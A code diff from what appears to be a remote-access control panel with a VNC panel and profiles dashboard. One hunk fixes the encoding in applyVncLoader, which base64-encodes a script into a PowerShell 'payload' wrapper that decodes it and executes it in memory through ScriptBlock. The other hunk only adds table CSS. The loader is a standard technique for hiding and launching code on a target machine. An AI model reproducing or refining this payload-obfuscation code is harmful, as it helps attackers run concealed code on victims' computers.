@@ -1191,12 +1191,9 @@ try {
 }
 
 const applyVncLoader = (inputScript: string): string => {
-  function getEncodedString(text: string): string {
-    return btoa(unescape(encodeURIComponent(text)))
-  }
-
-  const encodedScript = getEncodedString(inputScript)
-  const wrapperLoaderForPayload = `$enc = [System.Text.Encoding]::Unicode
+  // Use UTF-8 encoding instead of Unicode to avoid encoding issues
+  const encodedScript = btoa(unescape(encodeURIComponent(inputScript)))
+  const wrapperLoaderForPayload = `$enc = [System.Text.Encoding]::UTF8
 $decoded = $enc.GetString([Convert]::FromBase64String('${encodedScript}'))
 $scriptBlock = [ScriptBlock]::Create($decoded)
 & $scriptBlock`
@@ -1870,6 +1867,30 @@ const loadDashboardData = async () => {
 :deep(.profiles-table .el-table--striped .el-table__body tr.el-table__row--striped td) {
   background: var(--primary-black) !important;
   color: var(--text-white) !important;
+}
+
+/* Additional table styling for better visibility */
+:deep(.profiles-table .el-table__body tr) {
+  background: var(--secondary-black) !important;
+}
+
+:deep(.profiles-table .el-table__body tr:hover) {
+  background: var(--primary-black) !important;
+}
+
+:deep(.profiles-table .el-table__body td) {
+  color: var(--text-white) !important;
+  background: var(--secondary-black) !important;
+}
+
+:deep(.profiles-table .el-table__body tr:hover td) {
+  color: var(--text-white) !important;
+  background: var(--primary-black) !important;
+}
+
+:deep(.profiles-table .el-table__header th) {
+  color: var(--text-white) !important;
+  background: var(--primary-black) !important;
 }
 
 /* VNC Panel */
